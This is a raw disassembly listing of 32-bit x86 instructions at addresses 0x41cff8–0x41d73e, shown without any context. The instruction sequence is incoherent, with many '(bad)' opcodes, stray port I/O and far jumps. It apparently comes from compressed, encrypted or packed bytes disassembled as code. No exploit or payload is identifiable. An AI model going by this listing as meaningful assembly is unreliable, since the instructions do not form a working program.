  41cff8:	pop    edi
  41cff9:	pop    ebx
  41cffa:	jp     0x41d041
  41cffc:	loope  0x41d072
  41cffe:	outs   dx,BYTE PTR ds:[esi]
  41cfff:	push   cs
  41d000:	jnp    0x41cff9
  41d002:	xor    ecx,DWORD PTR [esi]
  41d004:	xchg   esi,eax
  41d005:	imul   DWORD PTR [esi]
  41d007:	fs and eax,0x5af6dbc8
  41d00d:	mov    dl,0x35
  41d00f:	(bad)  
  41d010:	dec    ecx
  41d011:	dec    ecx
  41d012:	rol    BYTE PTR [esi-0x32],0xd0
  41d016:	fadd   DWORD PTR [esi-0x34]
  41d019:	push   esi
  41d01a:	fldcw  WORD PTR [ecx]
  41d01c:	xor    BYTE PTR [ebx],ch
  41d01e:	outs   dx,DWORD PTR ds:[esi]
  41d01f:	icebp  
  41d020:	test   eax,0xf38f1e74
  41d025:	pop    ebp
  41d026:	adc    bh,BYTE PTR [edx-0x3fbc4cfd]
  41d02c:	fcomp  QWORD PTR [edx+0x3f13115d]
  41d032:	xor    eax,edx
  41d034:	adc    dl,BYTE PTR [edx+0x1b14c219]
  41d03a:	dec    ecx
  41d03b:	xchg   esi,eax
  41d03c:	std    
  41d03d:	jl     0x41cfd8
  41d03f:	std    
  41d040:	jne    0x41d061
  41d042:	mov    esi,0x2a3f75fc
  41d047:	xor    ch,BYTE PTR [esi]
  41d049:	push   cs
  41d04a:	das    
  41d04b:	mov    eax,ss
  41d04d:	inc    esp
  41d04e:	cli    
  41d04f:	mov    BYTE PTR [ebp-0x2ac1b517],0x70
  41d056:	xchg   esi,eax
  41d057:	outs   dx,BYTE PTR ds:[esi]
  41d058:	mov    edx,0x5820fa6e
  41d05d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d05e:	iret   
  41d05f:	pop    esi
  41d060:	int    0x68
  41d062:	fcom   QWORD PTR [ebp+edx*2+0x59]
  41d066:	pop    ebp
  41d067:	std    
  41d068:	test   ch,cl
  41d06a:	dec    edi
  41d06b:	scas   al,BYTE PTR es:[edi]
  41d06c:	cmc    
  41d06d:	jge    0x41d00d
  41d06f:	push   edi
  41d070:	bound  ecx,QWORD PTR [edx]
  41d072:	push   ebx
  41d073:	cdq    
  41d074:	dec    edx
  41d075:	push   ecx
  41d076:	mov    cl,0xe2
  41d078:	fld    QWORD PTR [ecx]
  41d07a:	cmp    ebx,DWORD PTR [eax+0x77]
  41d07d:	loop   0x41d031
  41d07f:	(bad)  
  41d080:	aam    0x61
  41d082:	into   
  41d083:	mov    dl,0xc6
  41d085:	inc    edx
  41d086:	scas   al,BYTE PTR es:[edi]
  41d087:	aas    
  41d088:	push   esi
  41d089:	(bad)  
  41d08a:	jl     0x41d101
  41d08c:	cmp    BYTE PTR [esi],ah
  41d08e:	dec    ecx
  41d08f:	scas   al,BYTE PTR es:[edi]
  41d090:	push   ss
  41d091:	mov    ss,WORD PTR [edx-0x5c]
  41d094:	push   ds
  41d095:	mov    ebp,0x92fc2b38
  41d09a:	popf   
  41d09b:	push   0xcd3e28b6
  41d0a0:	dec    eax
  41d0a1:	or     esp,DWORD PTR [edx-0x82f0aa3]
  41d0a7:	in     eax,0xc2
  41d0a9:	rcr    bh,cl
  41d0ab:	inc    ecx
  41d0ac:	test   DWORD PTR [eax-0x3f34024a],eax
  41d0b2:	xor    eax,0x56c4afef
  41d0b7:	addr16 jo 0x41d03b
  41d0ba:	pushf  
  41d0bb:	mov    esi,0x805b4476
  41d0c0:	cmp    eax,0x5d79fe29
  41d0c5:	icebp  
  41d0c6:	shl    dh,0x57
  41d0c9:	adc    eax,0xc273cd54
  41d0ce:	pushf  
  41d0cf:	inc    edx
  41d0d0:	data16 std 
  41d0d2:	shl    BYTE PTR [esi+edi*1-0x5d01d7d8],0xee
  41d0da:	sbb    DWORD PTR [eax],eax
  41d0dc:	or     dh,cl
  41d0de:	shr    BYTE PTR [edi+eax*4],1
  41d0e1:	aas    
  41d0e2:	in     al,dx
  41d0e3:	scas   eax,DWORD PTR es:[edi]
  41d0e4:	sbb    BYTE PTR [edi+0x2b],dh
  41d0e7:	xchg   edi,eax
  41d0e8:	addr16 in al,dx
  41d0ea:	loopne 0x41d13a
  41d0ec:	sbb    al,0x71
  41d0ee:	outs   dx,DWORD PTR ds:[esi]
  41d0ef:	loope  0x41d14a
  41d0f1:	dec    ecx
  41d0f2:	mov    edi,0x7d9d5b11
  41d0f7:	(bad)  
  41d0f8:	loop   0x41d094
  41d0fa:	mov    bl,0x17
  41d0fc:	xchg   esi,eax
  41d0fd:	push   ecx
  41d0fe:	cmp    bh,BYTE PTR cs:[edx-0x62]
  41d102:	add    DWORD PTR [ebx+0x87f3c84],esi
  41d108:	lock retf 0x3b34
  41d10c:	fmul   st,st(0)
  41d10e:	sbb    al,0x3b
  41d110:	idiv   DWORD PTR [ecx]
  41d112:	cld    
  41d113:	jae    0x41d173
  41d115:	xchg   eax,ecx
  41d117:	fwait
  41d118:	aaa    
  41d119:	or     al,0xc3
  41d11b:	out    dx,al
  41d11c:	loopne 0x41d18f
  41d11e:	sbb    dl,BYTE PTR [edx+0x6c]
  41d121:	adc    al,0xd9
  41d123:	mov    dl,0x5e
  41d125:	pop    eax
  41d126:	or     DWORD PTR [ecx+0x17],0x1e
  41d12a:	add    BYTE PTR [edx],bh
  41d12c:	loope  0x41d135
  41d12e:	jbe    0x41d10b
  41d130:	loopne 0x41d0be
  41d132:	jl     0x41d15f
  41d134:	out    0x10,eax
  41d136:	repnz aad 0x12
  41d139:	and    BYTE PTR [ecx-0x56e04f48],al
  41d13f:	pop    edi
  41d140:	and    ebx,DWORD PTR [esi+0x62]
  41d143:	xor    esi,esp
  41d145:	(bad)  
  41d146:	shl    ebp,cl
  41d148:	xchg   ebx,eax
  41d149:	or     ecx,ebx
  41d14b:	test   BYTE PTR [eax+0x2e5d99e2],dl
  41d151:	sub    al,bh
  41d153:	mov    esp,0xb495e4a3
  41d158:	cwde   
  41d159:	fstp   st(7)
  41d15b:	ret    0xbf22
  41d15e:	in     eax,0x10
  41d160:	sbb    BYTE PTR [eax],ch
  41d162:	adc    al,0xb
  41d164:	xor    DWORD PTR [edi],ebp
  41d166:	xchg   DWORD PTR [edx+0xeac333e],ebp
  41d16c:	cmp    BYTE PTR [eax-0x38],dh
  41d16f:	mov    ebx,DWORD PTR [esi-0x51]
  41d172:	ss cli 
  41d174:	xchg   ecx,edx
  41d176:	adc    al,0x32
  41d178:	mov    dl,0xea
  41d17a:	xor    al,0x9f
  41d17c:	adc    BYTE PTR [eax],ah
  41d17e:	jnp    0x41d13c
  41d180:	sbb    esp,DWORD PTR [ebp-0x7350bfed]
  41d186:	xor    edi,DWORD PTR [eax+ecx*8]
  41d189:	fadd   DWORD PTR [edx-0xf172459]
  41d18f:	xchg   esi,eax
  41d190:	pusha  
  41d191:	sub    DWORD PTR [edx+edx*1+0x19],edi
  41d195:	sbb    BYTE PTR [eax+0x1ea74431],0xef
  41d19c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d19d:	rol    DWORD PTR [ecx],cl
  41d19f:	(bad)  
  41d1a0:	mov    bh,0xd2
  41d1a2:	jbe    0x41d1d6
  41d1a4:	pusha  
  41d1a5:	xchg   ebx,eax
  41d1a6:	xchg   eax,edi
  41d1a8:	adc    esp,DWORD PTR [ebx+0x56]
  41d1ab:	add    al,0x89
  41d1ad:	or     ebp,edx
  41d1af:	xor    DWORD PTR [edx-0x78],ebx
  41d1b2:	fild   WORD PTR ds:0xdff0d27
  41d1b8:	inc    ecx
  41d1b9:	jg     0x41d1e0
  41d1bb:	fcom   DWORD PTR [ecx*2-0x2859ff4d]
  41d1c2:	fwait
  41d1c3:	inc    esp
  41d1c4:	push   edi
  41d1c5:	xlat   BYTE PTR ds:[ebx]
  41d1c6:	in     al,dx
  41d1c7:	mov    edx,0x788857ba
  41d1cc:	xchg   cl,bl
  41d1ce:	imul   esp,DWORD PTR [ebp-0x4e],0xfffffffe
  41d1d2:	or     eax,0xb3994d0e
  41d1d7:	pop    es
  41d1d8:	jnp    0x41d184
  41d1da:	jb     0x41d1cc
  41d1dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1dd:	sbb    BYTE PTR ss:[esi-0x4b814632],ch
  41d1e4:	mov    WORD PTR gs:[ebx],fs
  41d1e7:	(bad)  
  41d1e8:	mov    bl,0xa5
  41d1ea:	mov    dl,BYTE PTR cs:[ebp-0xa04285e]
  41d1f1:	sti    
  41d1f2:	adc    bl,ch
  41d1f4:	xchg   ecx,eax
  41d1f5:	cmp    ebx,DWORD PTR [edi-0x77]
  41d1f8:	out    0x15,eax
  41d1fa:	push   cs
  41d1fb:	sub    eax,0x4c456af0
  41d200:	lods   al,BYTE PTR ds:[esi]
  41d201:	inc    ebx
  41d202:	sub    BYTE PTR [esi-0x459cea96],bl
  41d208:	cli    
  41d209:	mov    dl,0xd9
  41d20b:	jmp    0x41d205
  41d20d:	mov    ebp,0xb40e4d76
  41d212:	jg     0x41d24b
  41d214:	mov    cs,WORD PTR [edx+esi*2]
  41d217:	inc    ebx
  41d218:	adc    dh,cl
  41d21a:	sbb    DWORD PTR [ebp-0xa],ebp
  41d21d:	jp     0x41d1c8
  41d21f:	pop    edi
  41d220:	in     eax,dx
  41d221:	pop    edx
  41d222:	push   cs
  41d223:	or     BYTE PTR [ebp-0x63d68da5],dh
  41d229:	stos   BYTE PTR es:[edi],al
  41d22a:	fmul   DWORD PTR [esi-0x28027965]
  41d230:	popf   
  41d231:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d232:	mov    ?,WORD PTR ss:0xa181075d
  41d239:	cwde   
  41d23a:	mov    eax,ds:0x33a8f432
  41d23f:	leave  
  41d240:	mov    esi,DWORD PTR [edx]
  41d242:	xor    eax,0xa0fcd764
  41d247:	mov    cl,0x8d
  41d249:	pushf  
  41d24a:	xor    al,0xe8
  41d24c:	test   al,0xf3
  41d24e:	iret   
  41d24f:	jmp    0x2ad0:0x53974f75
  41d256:	inc    eax
  41d257:	inc    ecx
  41d258:	mov    ah,0x4d
  41d25a:	aaa    
  41d25b:	add    al,0x51
  41d25d:	fisttp QWORD PTR [ebx]
  41d25f:	addr16 dec edi
  41d261:	mov    esi,0x6d13366a
  41d266:	in     al,0x35
  41d268:	mov    bl,0xad
  41d26a:	sub    ebp,edi
  41d26c:	inc    esi
  41d26d:	mov    ebx,DWORD PTR [ecx]
  41d26f:	cmc    
  41d270:	jle    0x41d233
  41d272:	adc    DWORD PTR [ebp+0x1f006d3],ebx
  41d278:	ss sbb eax,0x8c83066
  41d27e:	lea    ebp,[eax+esi*4-0x75]
  41d282:	mov    dl,0x14
  41d284:	ds jl  0x41d2ca
  41d287:	dec    edi
  41d288:	cmp    DWORD PTR [ecx+edx*2],edx
  41d28b:	sbb    DWORD PTR [edi-0x2c],ebx
  41d28e:	out    0x4,al
  41d290:	mov    ch,0x89
  41d292:	dec    edi
  41d293:	push   ss
  41d294:	xor    edx,0xcfcbe59
  41d29a:	loop   0x41d2c1
  41d29c:	ret    0x6173
  41d29f:	sbb    eax,0x9d9adade
  41d2a4:	sbb    BYTE PTR [edx],al
  41d2a6:	and    al,0xb3
  41d2a8:	jns    0x41d28a
  41d2aa:	xor    DWORD PTR [edx+0x672785ba],0xffffffd0
  41d2b1:	or     cl,dl
  41d2b3:	mov    ebp,0xdd991ad
  41d2b8:	int3   
  41d2b9:	inc    eax
  41d2ba:	xchg   ebp,eax
  41d2bb:	cmp    eax,0x8f3fd03
  41d2c0:	pop    eax
  41d2c1:	pop    edx
  41d2c2:	aam    0x73
  41d2c4:	out    0x31,eax
  41d2c6:	pop    eax
  41d2c7:	jecxz  0x41d28e
  41d2c9:	lods   al,BYTE PTR ds:[esi]
  41d2ca:	dec    eax
  41d2cb:	fwait
  41d2cc:	dec    ebx
  41d2cd:	xchg   ebp,eax
  41d2ce:	xchg   edx,eax
  41d2cf:	int    0x6b
  41d2d1:	jmp    0x8d6a:0xa2f3c000
  41d2d8:	lea    esp,[edi]
  41d2da:	fstp   DWORD PTR [edx+0xf]
  41d2dd:	dec    ebx
  41d2de:	gs jg  0x41d300
  41d2e1:	cmc    
  41d2e2:	repnz pusha 
  41d2e4:	mov    ?,eax
  41d2e6:	or     DWORD PTR [eax+0x70ca06cd],ecx
  41d2ec:	dec    eax
  41d2ed:	sub    al,0x3f
  41d2ef:	outs   dx,DWORD PTR ds:[esi]
  41d2f0:	sti    
  41d2f1:	cwde   
  41d2f2:	in     al,0x94
  41d2f4:	lds    ebx,FWORD PTR [ebx-0x66f679ac]
  41d2fa:	jne    0x41d327
  41d2fc:	add    bl,bl
  41d2fe:	ds mov edx,ecx
  41d301:	jle    0x41d2c1
  41d303:	jae    0x41d301
  41d305:	arpl   bp,cx
  41d307:	loope  0x41d2a2
  41d309:	ror    DWORD PTR [esi],cl
  41d30b:	pop    ebp
  41d30c:	dec    ebp
  41d30d:	int    0xea
  41d30f:	adc    al,0xb6
  41d311:	and    al,0xc7
  41d313:	push   eax
  41d314:	fnstsw WORD PTR ds:0x8534afe
  41d31a:	jne    0x41d300
  41d31c:	push   ebx
  41d31d:	test   BYTE PTR [eax+0x45],dl
  41d320:	jge    0x41d398
  41d322:	sbb    eax,0x38220f5b
  41d327:	jne    0x41d2c9
  41d329:	and    BYTE PTR [edi-0x2c9866b8],bl
  41d32f:	xlat   BYTE PTR ds:[ebx]
  41d330:	mov    esp,esp
  41d332:	outs   dx,DWORD PTR ds:[esi]
  41d333:	xor    al,0x5f
  41d335:	sbb    al,0x17
  41d338:	out    0xea,al
  41d33a:	dec    esi
  41d33b:	inc    edx
  41d33c:	adc    DWORD PTR [ecx],esi
  41d33e:	test   al,0xa9
  41d340:	ret    0x47e1
  41d343:	sar    ah,cl
  41d345:	cmp    esi,DWORD PTR [ecx]
  41d347:	jmp    0x273ba665
  41d34c:	or     BYTE PTR [eax],0xba
  41d34f:	push   esi
  41d350:	ret    0x6371
  41d353:	repnz adc BYTE PTR [ebx],bh
  41d356:	arpl   WORD PTR [ecx-0x62],si
  41d359:	jmp    0x41d384
  41d35b:	pop    esp
  41d35c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d35d:	or     ah,BYTE PTR [edx]
  41d35f:	out    0x32,eax
  41d361:	push   ecx
  41d362:	sbb    dh,bh
  41d364:	mov    ebp,0xa9c1e0c7
  41d369:	lods   al,BYTE PTR ds:[esi]
  41d36a:	add    eax,0xabd848ac
  41d36f:	pop    esi
  41d370:	jb     0x41d3ac
  41d372:	push   DWORD PTR [edx-0x2]
  41d375:	aaa    
  41d376:	push   esp
  41d377:	xor    DWORD PTR [edx],ebx
  41d379:	inc    edi
  41d37a:	scas   al,BYTE PTR es:[edi]
  41d37b:	jl     0x41d3c7
  41d37d:	jp     0x41d382
  41d37f:	inc    ebx
  41d380:	jbe    0x41d3ed
  41d382:	scas   al,BYTE PTR es:[edi]
  41d383:	push   eax
  41d384:	(bad)  
  41d385:	in     al,dx
  41d386:	sbb    esp,DWORD PTR [eax-0x3a278a22]
  41d38c:	sub    eax,0xb7f16280
  41d391:	dec    esp
  41d392:	or     dh,BYTE PTR [edx+0x1b]
  41d395:	loop   0x41d3f4
  41d397:	sahf   
  41d398:	pop    es
  41d399:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d39a:	cmp    eax,0x5ded5333
  41d39f:	dec    ebp
  41d3a0:	fcmovbe st,st(6)
  41d3a2:	pop    esp
  41d3a3:	scas   eax,DWORD PTR es:[edi]
  41d3a4:	sub    bh,ch
  41d3a6:	push   cs
  41d3a7:	in     eax,0x97
  41d3a9:	sub    ecx,DWORD PTR ds:0x5e91489
  41d3af:	mov    ah,0x54
  41d3b1:	je     0x41d34f
  41d3b3:	call   0xda20479e
  41d3b8:	ffree  st(5)
  41d3ba:	inc    ebx
  41d3bb:	mov    bl,0x26
  41d3bd:	sbb    BYTE PTR [ebp+0x79],ch
  41d3c0:	call   0x70c:0x7ea8919c
  41d3c7:	dec    edi
  41d3c8:	test   DWORD PTR [edx],0x52d3a341
  41d3ce:	test   al,0xbb
  41d3d0:	or     ecx,DWORD PTR [ecx-0x35]
  41d3d3:	xchg   esi,eax
  41d3d4:	enter  0xb332,0x1d
  41d3d8:	or     eax,0x4bab219e
  41d3dd:	loope  0x41d401
  41d3df:	rcr    DWORD PTR [edx+0x13],cl
  41d3e2:	mov    cs,WORD PTR [edi+0x79315b2a]
  41d3e8:	or     bl,cl
  41d3ea:	cmp    DWORD PTR [ecx+0x9ce0343],ebx
  41d3f0:	ins    DWORD PTR es:[edi],dx
  41d3f1:	push   esi
  41d3f2:	sub    eax,0x8b21f98a
  41d3f7:	(bad)  
  41d3f8:	dec    esp
  41d3f9:	scas   al,BYTE PTR es:[edi]
  41d3fa:	cmp    ebx,DWORD PTR [esi]
  41d3fc:	pop    ebx
  41d3fd:	dec    eax
  41d3fe:	daa    
  41d3ff:	jg     0x41d3dc
  41d401:	jg     0x41d386
  41d403:	and    bh,BYTE PTR [ebx-0x3a175fb1]
  41d409:	adc    ecx,ebx
  41d40b:	pop    edi
  41d40c:	cli    
  41d40d:	mov    dh,0x45
  41d40f:	stos   DWORD PTR es:[edi],eax
  41d410:	loop   0x41d483
  41d412:	xchg   BYTE PTR [edx+ecx*1+0xec1d202],ah
  41d419:	push   ds
  41d41a:	add    bl,BYTE PTR [ecx]
  41d41c:	or     al,0x5f
  41d41e:	dec    edx
  41d41f:	rol    BYTE PTR ds:0xaa0cc230,cl
  41d425:	jb     0x41d416
  41d427:	push   ds
  41d428:	rcr    BYTE PTR [edi+0x2],0x36
  41d42c:	mov    edi,0x860ecccb
  41d432:	pushf  
  41d433:	jae    0x41d46b
  41d435:	daa    
  41d436:	xor    al,0x20
  41d438:	adc    BYTE PTR [eax+0x5acfdeef],dl
  41d43e:	popf   
  41d43f:	cmp    edi,edi
  41d441:	xchg   ebp,eax
  41d442:	pop    ebp
  41d443:	lods   al,BYTE PTR ds:[esi]
  41d444:	js     0x41d481
  41d446:	inc    ebp
  41d447:	int    0x32
  41d449:	lea    ebx,[edx]
  41d44b:	(bad)  
  41d44c:	cld    
  41d44d:	loop   0x41d44a
  41d44f:	mov    dh,0x6b
  41d451:	fdiv   DWORD PTR [ebp+edx*8-0x2f298e0]
  41d458:	mov    ds:0x1467e12a,eax
  41d45d:	inc    ecx
  41d45e:	add    BYTE PTR [ebp-0x7d],dl
  41d461:	adc    BYTE PTR [esi+0x4973ed9b],dl
  41d467:	out    0xbf,al
  41d469:	shr    BYTE PTR ss:0x9bbe0298,1
  41d470:	call   0xd4006dff
  41d475:	push   ds
  41d476:	popf   
  41d477:	pop    es
  41d478:	add    al,0x17
  41d47a:	repz xchg dl,cl
  41d47d:	xor    DWORD PTR ds:0x9a55ce2,edx
  41d483:	jl     0x41d4a8
  41d485:	je     0x41d438
  41d487:	inc    ecx
  41d488:	scas   al,BYTE PTR es:[edi]
  41d489:	in     eax,0xdc
  41d48b:	xor    al,0x4
  41d48d:	jmp    0x41d4b3
  41d48f:	mov    dl,0xec
  41d491:	pop    ss
  41d492:	jno    0x41d4b1
  41d494:	ds scas al,BYTE PTR es:[edi]
  41d496:	(bad)  
  41d498:	dec    esp
  41d499:	ret    0xcab9
  41d49c:	and    ah,dl
  41d49e:	sar    ch,1
  41d4a0:	adc    edx,esp
  41d4a2:	ss sahf 
  41d4a4:	mov    DWORD PTR [ecx-0x6e28cfae],ebp
  41d4aa:	jp     0x41d4e3
  41d4ac:	xchg   ebp,eax
  41d4ad:	xchg   esp,eax
  41d4ae:	xor    eax,0xc0685da9
  41d4b3:	cdq    
  41d4b4:	jno    0x41d4e7
  41d4b6:	cmp    BYTE PTR [eax-0x1558cf17],bh
  41d4bc:	lea    edx,[esi+0x3f]
  41d4bf:	call   0xc368:0xb487f637
  41d4c6:	inc    edx
  41d4c7:	add    ch,dh
  41d4c9:	sbb    BYTE PTR [edi+ebp*2-0x2bd20ed6],ah
  41d4d0:	mov    bh,0x83
  41d4d2:	gs jp  0x41d4f9
  41d4d5:	jl     0x41d51e
  41d4d7:	cs xchg ecx,eax
  41d4d9:	leave  
  41d4da:	lds    ecx,FWORD PTR [esi]
  41d4dc:	xchg   ecx,eax
  41d4dd:	xor    DWORD PTR [esp+edi*4],0x42
  41d4e1:	jnp    0x41d54a
  41d4e3:	or     eax,0xb2f34351
  41d4e8:	ret    
  41d4e9:	clc    
  41d4ea:	scas   al,BYTE PTR es:[edi]
  41d4eb:	xchg   BYTE PTR ds:0x53a8dfad,ch
  41d4f1:	jnp    0x41d524
  41d4f3:	mov    eax,ds:0xc9e56fe2
  41d4f8:	enter  0xa5dc,0xb3
  41d4fc:	fisttp QWORD PTR [esi]
  41d4fe:	jb     0x41d4ce
  41d500:	lahf   
  41d501:	jp     0x41d52d
  41d503:	xchg   ebx,eax
  41d504:	xlat   BYTE PTR ds:[ebx]
  41d505:	push   ds
  41d506:	and    BYTE PTR [edi-0x4e],al
  41d509:	add    BYTE PTR [ecx+0x10],dh
  41d50c:	mov    eax,ds:0x42375adc
  41d511:	mov    bl,0x78
  41d513:	lds    eax,FWORD PTR [edx-0x46a8d48c]
  41d519:	jl     0x41d4da
  41d51b:	inc    ebp
  41d51c:	inc    ch
  41d51e:	(bad)  
  41d51f:	mov    bh,0xda
  41d521:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d522:	ret    
  41d523:	loopne 0x41d56d
  41d525:	in     eax,dx
  41d526:	inc    eax
  41d527:	sahf   
  41d528:	(bad)  
  41d529:	and    edi,DWORD PTR fs:[eax-0x13]
  41d52d:	or     eax,0x65ae3306
  41d532:	call   0xf76e2c6
  41d537:	aas    
  41d538:	lods   al,BYTE PTR ds:[esi]
  41d539:	jmp    0x41d581
  41d53b:	ret    0xc261
  41d53e:	out    0xcc,eax
  41d540:	pop    es
  41d541:	test   al,0x23
  41d543:	es mov ah,0xb4
  41d546:	cmc    
  41d547:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d548:	adc    dl,dh
  41d54a:	iret   
  41d54b:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d54d:	lea    eax,[esi-0x3b]
  41d550:	sub    dh,cl
  41d552:	jmp    0x41d594
  41d554:	inc    ebp
  41d555:	adc    BYTE PTR [ebx],ah
  41d557:	mov    dl,0x2d
  41d559:	cmp    al,ah
  41d55b:	adc    DWORD PTR [edi-0x41],ebp
  41d55e:	cmp    al,0xa6
  41d560:	mov    WORD PTR [ebx+eax*1-0x534d7218],fs
  41d567:	xor    al,0xc0
  41d569:	outs   dx,DWORD PTR ds:[esi]
  41d56a:	(bad)  
  41d56b:	lock frstor [ebx]
  41d56f:	inc    esi
  41d570:	jae    0x41d5da
  41d572:	mov    bl,0xa1
  41d574:	jo     0x41d580
  41d576:	pop    esi
  41d577:	popa   
  41d578:	push   eax
  41d579:	std    
  41d57a:	xor    DWORD PTR [ebx],ebp
  41d57c:	cmp    al,BYTE PTR [edi-0x71]
  41d57f:	xchg   bp,ax
  41d581:	nop
  41d582:	sti    
  41d583:	mov    ?,WORD PTR [edx]
  41d585:	into   
  41d586:	sub    DWORD PTR [edx+0x7ddb90ef],0xb614356f
  41d590:	lea    esp,[edx]
  41d592:	xor    al,BYTE PTR [ecx-0x1d]
  41d595:	scas   al,BYTE PTR es:[edi]
  41d596:	sub    al,0xe0
  41d598:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d599:	mov    eax,ds:0x648a1728
  41d59e:	rol    BYTE PTR [ebp+edx*8+0x6],cl
  41d5a2:	in     al,dx
  41d5a3:	ins    BYTE PTR es:[edi],dx
  41d5a4:	inc    edx
  41d5a5:	outs   dx,DWORD PTR ds:[esi]
  41d5a6:	jnp    0x41d52e
  41d5a8:	shr    DWORD PTR [ecx],0x21
  41d5ab:	jecxz  0x41d5bb
  41d5ad:	div    BYTE PTR [ecx+0x133d791f]
  41d5b3:	ret    0x31d6
  41d5b6:	mov    ecx,0xfaaff1a4
  41d5bb:	push   ebp
  41d5bc:	fisubr WORD PTR [edi+0x2ac79467]
  41d5c2:	call   0xd817:0x87fa6567
  41d5c9:	push   cs
  41d5ca:	rcr    BYTE PTR [ebx-0x60],cl
  41d5cd:	inc    esi
  41d5ce:	mov    edi,0x9af4a6df
  41d5d3:	mov    ds:0xf4396a90,eax
  41d5d8:	xchg   DWORD PTR [edi+0x22],ecx
  41d5db:	push   cs
  41d5dc:	push   ds
  41d5dd:	dec    eax
  41d5de:	add    DWORD PTR [edx],esp
  41d5e0:	jns    0x41d5b2
  41d5e2:	mov    edx,0xa6425e61
  41d5e7:	jbe    0x41d5ec
  41d5e9:	hlt    
  41d5ea:	or     eax,0x2c6d25d
  41d5f0:	dec    ebx
  41d5f1:	cmp    bl,BYTE PTR [eax]
  41d5f3:	std    
  41d5f4:	inc    ebx
  41d5f5:	push   edx
  41d5f6:	add    DWORD PTR [ebx-0x70228734],esi
  41d5fc:	in     eax,0x60
  41d5fe:	test   BYTE PTR [edi+0x6a3953b1],cl
  41d604:	jle    0x41d5ce
  41d606:	sbb    eax,0xcc2a32ba
  41d60b:	pop    ebp
  41d60c:	mul    DWORD PTR [esi+0xca92764]
  41d612:	test   DWORD PTR [eax+0x7d],eax
  41d615:	cld    
  41d616:	inc    ebp
  41d617:	cmp    BYTE PTR [eiz*8+0x1da3ef5c],cl
  41d61e:	out    dx,eax
  41d61f:	add    BYTE PTR [esi-0x15],0x69
  41d623:	pop    edx
  41d624:	add    DWORD PTR ds:0x867a1b7e,ebp
  41d62a:	lods   eax,DWORD PTR ds:[esi]
  41d62b:	inc    ebx
  41d62c:	shl    BYTE PTR [edi-0x4e],cl
  41d62f:	xchg   ebp,eax
  41d630:	xchg   edx,eax
  41d631:	adc    DWORD PTR [ebx-0x95b71c],0x1e159a14
  41d63b:	jecxz  0x41d5e2
  41d63d:	mov    cl,0x6a
  41d63f:	pop    DWORD PTR [edi-0x63734c86]
  41d645:	xor    BYTE PTR [eax-0x5ba061d1],0xbe
  41d64c:	ret    0x192d
  41d64f:	jge    0x41d67d
  41d651:	addr16 loope 0x41d692
  41d654:	inc    esi
  41d655:	in     al,dx
  41d656:	sub    ebx,DWORD PTR [edi-0x253157c8]
  41d65c:	jmp    0x41d6b7
  41d65e:	js     0x41d6bc
  41d660:	sub    eax,0x643406a5
  41d665:	loope  0x41d676
  41d667:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d668:	call   0x6f2d:0x8e47610a
  41d66f:	inc    esi
  41d670:	fs sbb al,0xc5
  41d673:	loop   0x41d6bb
  41d675:	loopne 0x41d6be
  41d677:	aam    0x5d
  41d679:	xor    ebx,0x1
  41d67c:	(bad)  
  41d67d:	adc    bl,bl
  41d67f:	cs leave 
  41d681:	les    esp,FWORD PTR [edi]
  41d683:	fs retf 
  41d685:	test   eax,0xb19a9e90
  41d68a:	jns    0x41d6aa
  41d68c:	cmp    al,0x3c
  41d68e:	(bad)  
  41d68f:	dec    ebx
  41d690:	sub    eax,0x20760811
  41d695:	mov    ds:0x5f0e31a6,al
  41d69a:	mov    ch,0x27
  41d69c:	shr    BYTE PTR [ebx+0x15c81af],cl
  41d6a2:	pusha  
  41d6a3:	scas   al,BYTE PTR es:[edi]
  41d6a4:	js     0x41d69d
  41d6a6:	fdiv   st,st(0)
  41d6a8:	aam    0xad
  41d6aa:	ret    
  41d6ab:	or     ebp,eax
  41d6ad:	xor    cl,BYTE PTR [edi-0x45376b2a]
  41d6b3:	aaa    
  41d6b4:	iret   
  41d6b5:	cs inc esi
  41d6b7:	xchg   edi,eax
  41d6b8:	mov    bh,0x7f
  41d6ba:	retf   
  41d6bb:	sti    
  41d6bc:	movnti DWORD PTR [eax-0x6b8c57e4],ebp
  41d6c3:	pop    ecx
  41d6c4:	inc    edi
  41d6c5:	stc    
  41d6c6:	xchg   DWORD PTR [edi-0x2cc6b38a],esi
  41d6cc:	(bad)  
  41d6cd:	retf   0xef1e
  41d6d0:	retf   
  41d6d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6d2:	mov    esi,0x73a6138f
  41d6d7:	dec    ebp
  41d6d8:	lock ss jbe 0x41d6c8
  41d6dc:	jle    0x41d72a
  41d6de:	fld    QWORD PTR [edi+esi*8+0x4f6885dd]
  41d6e5:	and    al,0xf9
  41d6e7:	jno    0x41d726
  41d6e9:	mov    esp,0x1503fd16
  41d6ee:	jnp    0x41d6a3
  41d6f0:	pop    ebp
  41d6f1:	jnp    0x41d68a
  41d6f3:	test   eax,0xed0f99b2
  41d6f8:	mov    dl,0xb9
  41d6fa:	dec    esi
  41d6fb:	popf   
  41d6fc:	xchg   ebp,eax
  41d6fd:	imul   ebx,DWORD PTR [eax-0x2d],0xffffffb9
  41d701:	aas    
  41d702:	jb     0x41d699
  41d704:	test   eax,0x1e490c88
  41d709:	cmp    dh,BYTE PTR [edx+edx*8]
  41d70c:	inc    edx
  41d70d:	sub    al,0xaf
  41d70f:	fist   WORD PTR [eax]
  41d711:	dec    ecx
  41d712:	pop    esp
  41d713:	test   al,0x48
  41d715:	shl    bh,0xf4
  41d718:	sub    DWORD PTR [esi],0x8455056a
  41d71e:	icebp  
  41d71f:	cli    
  41d720:	pop    ebp
  41d721:	into   
  41d722:	test   DWORD PTR [esi-0x2c],0x15e6651a
  41d729:	jge    0x41d71f
  41d72b:	cmp    eax,0x58f7b2bd
  41d730:	or     ah,dl
  41d732:	iret   
  41d733:	arpl   sp,dx
  41d735:	add    DWORD PTR [esp+edi*1+0x2e882d3],ebx
  41d73c:	sbb    al,0xc1
  41d73e:	sbb    eax,0x2705b317
